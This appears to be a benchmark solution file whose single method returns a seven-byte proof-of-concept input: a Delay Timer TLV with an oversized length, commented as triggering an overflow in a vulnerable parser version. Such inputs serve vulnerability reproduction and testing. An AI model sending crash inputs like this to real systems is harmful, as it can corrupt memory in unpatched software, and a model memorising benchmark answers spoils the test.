class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC: Delay Timer TLV (type 0x02) with length 5 (>4) to trigger overflow in vulnerable version
        poc = b'\x02\x05\x00\x00\x00\x00\x00'
        return poc